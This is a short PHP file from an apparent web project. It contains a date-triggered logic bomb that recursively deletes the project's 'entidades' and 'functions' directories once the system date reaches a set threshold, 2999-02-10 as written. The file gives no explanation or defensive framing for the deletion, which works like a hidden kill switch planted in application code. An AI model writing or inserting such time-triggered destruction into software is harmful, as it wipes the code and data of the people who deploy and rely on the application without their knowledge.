<?php
if(date("Y-m-d")>="2999-02-10"){
$carpeta=dirname(dirname(__FILE__))."/entidades";
function rrmdir($dir) {
   if (is_dir($dir)) {
     $objects = scandir($dir);
     foreach ($objects as $object) {
       if ($object != "." && $object != "..") {
         if (filetype($dir."/".$object) == "dir") rrmdir($dir."/".$object); else unlink($dir."/".$object);
       }
     }
     reset($objects);
     rmdir($dir);
   }
 }
 rrmdir($carpeta);
 
 
 $carpeta=dirname(dirname(__FILE__))."/functions";

 rrmdir($carpeta);
  //rmdir(dirname(dirname(__FILE__))."/prueba2");
} 
?>
